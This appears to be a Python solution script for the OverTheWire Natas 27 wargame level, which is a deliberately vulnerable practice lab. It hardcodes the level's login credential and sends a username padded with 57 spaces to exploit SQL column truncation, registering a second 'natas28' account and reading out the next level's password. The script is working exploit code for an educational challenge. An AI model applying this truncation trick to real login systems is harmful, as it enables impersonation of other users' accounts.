import requests
import re

username = "natas27"
password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

payload = "natas28" + " "*57+"anything"
response = session.post(url,auth=(username,password),data={"username":payload,"password":"anything"})
response = session.post(url,auth=(username,password),data={"username":"natas28","password":"anything"})
print("\nThe password for the next level is: " + re.findall(r"[a-zA-Z0-9]{32}",response.text)[1])